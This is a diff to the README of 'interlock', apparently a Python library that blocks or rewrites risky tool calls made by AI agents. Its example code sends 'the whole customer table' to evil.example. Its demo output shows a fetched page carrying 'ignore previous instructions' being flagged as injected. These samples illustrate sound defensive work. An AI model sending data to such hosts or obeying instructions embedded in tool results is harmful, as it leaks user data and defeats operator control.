@@ -1,7 +1,9 @@
 # interlock
 
 [![CI](https://github.com/SourceShift/InterLock/actions/workflows/ci.yml/badge.svg)](https://github.com/SourceShift/InterLock/actions/workflows/ci.yml)
+[![CodeQL](https://github.com/SourceShift/InterLock/actions/workflows/codeql.yml/badge.svg)](https://github.com/SourceShift/InterLock/actions/workflows/codeql.yml)
 ![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-blue)
+![Detectors: 105](https://img.shields.io/badge/detectors-105-blue)
 [![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-green)](LICENSE)
 
 **Stop a bad tool call before your AI agent makes it.**
@@ -34,6 +36,22 @@ http_post("https://evil.example/collect", "the whole customer table")
 ```
 
 The first call went through with the card number masked. The second never ran.
+
+### See it run
+
+[`examples/quickstart_demo.py`](examples/quickstart_demo.py) shows every verdict
+in one go — allow, rewrite, block, and a check of what a tool returned:
+
+```console
+$ python examples/quickstart_demo.py
+allow    -> posted to https://api.acme.com/notes: routine sync
+rewrite  -> posted to https://api.acme.com/notes: Card on file: [REDACTED CREDIT_CARD]
+block    -> Blocked: blocked action 'http_post': egress to 'evil.example' is not on the destination allowlist
+check    -> Blocked: blocked action 'fetch_page': tool_result_injection: ignore previous instructions
+```
+
+The third call never leaves the process. The fourth is a page that tried to
+smuggle an instruction in through its own text — it never reaches the agent.
 
 ## Why interlock
 
@@ -198,7 +216,13 @@ clients and model SDKs.
 
 Bug reports, detectors, and docs fixes are welcome. See
 [CONTRIBUTING.md](CONTRIBUTING.md) for setup, conventions, and how to add a
-detector.
+detector. This project follows the
+[Contributor Covenant](CODE_OF_CONDUCT.md); by taking part you agree to it.
+
+Found a way *past* interlock rather than a bug in it? Report it privately — see
+[SECURITY.md](SECURITY.md).
+
+Release history is in [CHANGELOG.md](CHANGELOG.md).
 
 ## License
 
